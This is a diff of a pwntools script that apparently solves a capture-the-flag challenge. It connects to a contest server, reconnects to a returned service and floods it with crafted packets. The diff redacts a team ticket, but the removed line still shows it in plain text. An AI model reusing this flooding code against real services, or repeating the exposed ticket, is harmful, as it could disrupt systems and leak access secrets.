@@ -38,7 +38,6 @@ from pwn import *
 import zlib
 import binascii
 
-
 def send_data(c, typeCode, seq, flags, payload):
     bits1_3 = (typeCode >> 8) & 0x3
     bit4 = (flags >> 16) & 0x8
@@ -85,14 +84,13 @@ def read_entry(c):
 
 conn = remote('spacerace.satellitesabove.me', 5063)
 print conn.recvline()
-conn.sendline('ticket{bravo70356whiskey:GFmffmBdjY7l-HU1vYmZ9r0ndaao8K7omtj58JfSg4hmCjKRcZweU69LQA5tKbrCWQ}')
+conn.sendline('ticket{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}')
 real = conn.recvline()
 conn.close()
 
 c2 = remote(real[13:].split(':')[0], int(real.split(':')[1]))
 
 print "Connected to service"
-
 
 for test in range(100):
   status, payload, typeId, seqno, flags = read_entry(c2)
@@ -106,8 +104,6 @@ for test in range(100):
     # Spam it hard
     for i in range(1000):
       send_data(c2, 0x64, 0, 0x3000000, '\x02'*10)
-
-
 
 c2.close()
 ```
